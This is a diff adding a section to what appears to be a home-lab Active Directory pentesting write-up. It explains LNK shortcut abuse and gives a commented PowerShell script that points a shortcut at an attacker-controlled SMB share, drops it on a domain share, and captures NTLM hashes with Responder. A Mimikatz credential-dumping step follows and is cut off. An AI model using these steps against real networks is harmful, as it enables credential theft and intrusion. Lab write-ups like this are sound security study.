@@ -304,7 +304,76 @@ Users should not have administrative rights on their local machines unless absol
 
 - LNK file attacks
 
-- GPP / cPassword attacks
+### What are the LNK files?
+
+They provide a quick way to access files, folders, application, or network locations without navigating through the entire file system.
+
+This file contains metadata such as target path, working directory, icon location, description, hostkey, window style.
+
+There are different types of attacks that leverage the LNK files.
+
+First of all, attackers can create LNK files that execute malicious scripts or commands when it opened.
+
+Second of all, LNK files can point to remote resources, prompting the system to authenticate and potentially exposing credentials to attackers.
+
+I am going to go for the second way of abusing LNK files.
+
+1. Create the shell object in powershell
+
+```powershell
+$objShell = New-Object -ComObject WScript.shell
+# This line creates a new shell object
+$lnk = $objShell.CreateShortcut("C:\test.lnk")
+# This line creates a new shortcut file named `test.lnk` in the `C:\` directory.
+$lnk.TargetPath = "\\192.168.64.37\@test.png"
+# This line specifies the location that the shortcut points to. This png file is pointing to attack machine
+$lnk.WindowStyle = 1
+# This line sets the window should appear when the shortcut is activated. `1` value means that window should be opened normally.
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+# This line specifies the icon that should be used for the shortcut.
+$lnk.Description = "Test"
+# This line provides a textual description of the shortcut. This description appears when the user hovers over the shortcut.
+$lnk.HotKey = "Ctrl+Alt+T"
+# This line sets a keyboard shortcut for the LNK file. `Ctrl+Alt+T` will activate the shortcut.
+$lnk.Save()
+# This line saves the configured shortcut.
+```
+
+On the PUNISHER machine, I created a shortcut file using powershell.
+
+![createdFile](../assets/img/AD2/Screenshot%202024-07-26%20at%2018.11.52.png)
+
+![savedFile](../assets/img/AD2/Screenshot%202024-07-26%20at%2018.57.04.png)
+
+And then copied and pasted this `test` file into `\\HYDRA-DC\hackme`
+
+![movedFile](../assets/img/AD2/Screenshot%202024-07-26%20at%2018.44.08.png)
+
+Ready to capture the password hash using `responder`.
+
+`responder -I eth0 -dp`
+
+![responder1](../assets/img/AD2/Screenshot%202024-07-26%20at%2019.25.47.png)
+
+![responder2](../assets/img/AD2/Screenshot%202024-07-26%20at%2019.25.53.png)
+
+![responder3](../assets/img/AD2/Screenshot%202024-07-26%20at%2019.26.08.png)
+
+Make an event by refreshing.
+
+![tryHashDumping](../assets/img/AD2/Screenshot%202024-07-26%20at%2019.32.50.png)
+
+![hashdumped](../assets/img/AD2/Screenshot%202024-07-26%20at%2019.29.38.png)
+
+- Credential dumping with `Mimikatz`
+
+`Mimikatz` is a tool to view and steal credentials, generate Kerberos tickets, and leverage attacks.
+
+To proceed with this attack, I logged in `peterparker` user in SPIDERMAN machine.
+
+1. Download the mimikats-related files. 
+
+## After compromising the domain controller/admin?
 
 ## Additional Active Directory Attacks
 
